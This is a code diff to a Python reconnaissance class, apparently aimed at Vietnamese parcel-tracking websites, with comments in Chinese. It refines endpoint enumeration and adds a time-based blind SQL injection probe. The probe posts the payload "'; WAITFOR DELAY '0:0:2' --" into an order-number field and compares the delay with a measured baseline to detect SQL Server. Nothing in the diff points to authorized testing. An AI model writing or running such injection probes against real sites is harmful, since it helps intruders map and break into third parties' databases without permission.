@@ -266,7 +266,7 @@ class VietnameseFingerprinter:
         try:
             # 获取页面内容进行分析
             async with session.get(url, timeout=10) as response:
-                content = await response.text().lower()
+                content = (await response.text()).lower()
 
                 # 检查业务关键词
                 tracking_keywords = ["tracking", "track", "追踪", "运单", "订单号", "đơn hàng"]
@@ -331,9 +331,18 @@ class VietnameseFingerprinter:
                 for endpoint in endpoint_list:
                     test_url = f"{url.rstrip('/')}{endpoint}"
                     try:
+                        status = 0
                         async with session.head(test_url, timeout=5) as response:
-                            if response.status < 500:
-                                endpoints[category].append(test_url)
+                            status = response.status
+                        if status == 405:
+                            # HEAD 被拒绝时回退 GET 复核
+                            try:
+                                async with session.get(test_url, timeout=5) as response:
+                                    status = response.status
+                            except Exception:
+                                pass
+                        if status < 400:
+                            endpoints[category].append(test_url)
                     except:
                         pass
 
@@ -370,7 +379,8 @@ class VietnameseFingerprinter:
         services = []
 
         try:
-            content = await session.get(url, timeout=10).text()
+            async with session.get(url, timeout=10) as response:
+                content = await response.text()
 
             # 检查脚本中的第三方服务
             script_patterns = [
@@ -405,13 +415,26 @@ class VietnameseFingerprinter:
             if endpoints.get('tracking'):
                 tracking_url = endpoints['tracking'][0]
                 # 尝试注入一个会产生错误信息的payload
+                # 先取正常请求延迟 baseline，再做时间盲注对比，避免慢响应误判
+                baseline = 0.0
+                try:
+                    for _ in range(2):
+                        start_time = time.time()
+                        async with session.post(tracking_url, data={"MaDonHang": "000000"}, timeout=10) as response:
+                            await response.read()
+                        baseline += time.time() - start_time
+                    baseline /= 2
+                except Exception:
+                    baseline = 0.0
+
                 test_data = {"MaDonHang": "'; WAITFOR DELAY '0:0:2' --"}
 
                 start_time = time.time()
-                async with session.post(tracking_url, data=test_data, timeout=10) as response:
+                async with session.post(tracking_url, data=test_data, timeout=15) as response:
+                    await response.read()
                     response_time = time.time() - start_time
 
-                if response_time > 1.5:
+                if baseline > 0 and response_time > max(baseline * 2, baseline + 1.0):
                     return "SQL Server (时间延迟检测)"
 
             # 检查ASP.NET特定的错误页面
